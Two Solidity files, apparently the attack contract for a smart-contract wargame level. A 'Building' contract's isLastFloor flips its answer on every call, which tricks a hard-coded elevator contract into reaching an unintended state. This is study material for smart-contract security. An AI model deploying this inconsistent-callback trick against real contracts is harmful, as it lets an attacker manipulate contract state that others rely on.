//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./IElevator.sol";

contract Building {
    IElevator elevator = IElevator(0xd57fF67Cf618aB50aff5D65ceA987fD2368a9C75);
    bool check = true;

    function isLastFloor(uint _floor) public returns (bool) {
        check = !check;
        return check;
    }

    function callButton() public {
        elevator.goTo(5);
    }
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}